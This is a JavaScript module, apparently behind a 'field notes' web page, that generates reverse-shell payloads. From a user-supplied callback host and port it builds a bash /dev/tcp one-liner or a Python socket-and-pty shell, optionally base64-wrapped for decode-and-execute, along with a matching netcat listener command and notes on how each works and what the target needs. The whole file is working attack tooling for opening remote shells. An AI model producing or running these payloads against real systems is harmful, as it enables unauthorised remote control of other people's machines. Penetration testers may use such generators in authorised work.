// Pure string generation. No sockets, command execution, storage or network calls.
export function validateSettings({ host, port, runtime, representation }) {
  host = String(host).trim();
  const labels = host.split('.');
  const validHostname = host.length <= 253 && labels.every(label => /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$/.test(label));
  const numeric = /^[\d.]+$/.test(host);
  const validIPv4 = labels.length === 4 && labels.every(label => /^\d{1,3}$/.test(label) && Number(label) <= 255 && (label === '0' || !label.startsWith('0')));
  if (!validHostname || (numeric && !validIPv4)) throw new Error('Use a valid IPv4 address or hostname, without spaces, a URL scheme or shell characters.');
  if (!/^\d{1,5}$/.test(String(port)) || Number(port) < 1 || Number(port) > 65535) throw new Error('Choose a port from 1 to 65535.');
  if (!['bash', 'python'].includes(runtime) || !['plain', 'base64'].includes(representation)) throw new Error('Choose one of the supported runtimes and representations.');
  return { host, port: Number(port), runtime, representation };
}
const quote = text => "'" + text.replaceAll("'", "'\\''") + "'";
export function buildSession(input) {
  const settings = validateSettings(input);
  const { host, port, runtime, representation } = settings;
  let decoded, plain, payload, requirements, mechanism;
  if (runtime === 'bash') {
    decoded = `bash -i >& /dev/tcp/${host}/${port} 0>&1`;
    plain = `bash -c ${quote(decoded)}`;
    payload = representation === 'base64' ? `printf '%s' ${quote(btoa(plain))} | base64 --decode | bash` : plain;
    requirements = 'Target: Bash built with networking redirections. /bin/sh alone is not sufficient.';
    if (representation === 'base64') requirements += ' This wrapper also requires GNU base64 (--decode).';
    mechanism = 'Bash opens a TCP stream, redirects stdout/stderr to it and duplicates stdin from that descriptor. The outer bash -c keeps Bash-specific parsing out of the invoking shell. This does not allocate a PTY.';
  } else {
    decoded = `import os,socket,pty; s=socket.create_connection((${JSON.stringify(host)},${port})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")`;
    plain = `python3 -c ${quote(decoded)}`;
    payload = representation === 'base64' ? `python3 -c ${quote(`import base64; exec(base64.b64decode("${btoa(decoded)}"))`)}` : plain;
    requirements = 'Target: Python 3 on a POSIX system, a working /bin/sh and PTY support. Not a Windows example.';
    mechanism = 'Python opens a socket, duplicates its descriptor onto stdin/stdout/stderr, then starts /bin/sh under a pseudo-terminal. A PTY does not automatically synchronize the local terminal’s size or settings.';
  }
  return { settings, listener: `nc -lvnp ${port}`, decoded, plain, payload, requirements, mechanism };
}
export function sessionMarkdown(session) {
  return `# Field notes — shell session\n\nRuntime: ${session.settings.runtime}\nRepresentation: ${session.settings.representation}\nCallback: ${session.settings.host}:${session.settings.port}\n\n## Listener (Netcat)\n\n\`\`\`sh\n${session.listener}\n\`\`\`\n\n## Target-side command\n\n\`\`\`sh\n${session.payload}\n\`\`\`\n\n## Underlying command\n\n\`\`\`\n${session.decoded}\n\`\`\`\n\n${session.requirements}\n\n${session.mechanism}\n\nEncoding changes representation, not privileges or detectability. Generated locally; nothing was executed by the page.\n\nSource: https://technoflux.github.io/field-notes/\n`;
}
